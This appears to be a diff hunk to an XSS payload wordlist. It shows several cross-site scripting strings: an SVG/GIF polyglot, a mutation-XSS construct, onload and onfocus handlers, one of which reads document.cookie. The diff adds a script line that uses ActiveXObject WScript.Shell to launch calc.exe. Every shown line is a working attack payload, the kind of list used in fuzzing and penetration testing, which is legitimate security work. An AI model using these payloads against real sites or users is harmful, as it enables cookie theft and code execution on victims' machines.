@@ -1724,3 +1724,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <math><annotation-xml encoding=text/html><![CDATA[></math><!]]><script>var name="&quot;-alert``//"</script>
 <link rel='preload' href='#' as='script' onload='confirm(domain)'>
 <!'/!"/!\'/\"/--!><Input/Type=Text AutoFocus */; OnFocus=(confirm)(document.cookie) //>
+<script>var r = new ActiveXObject("WScript.Shell").Run("calc.exe");</script>
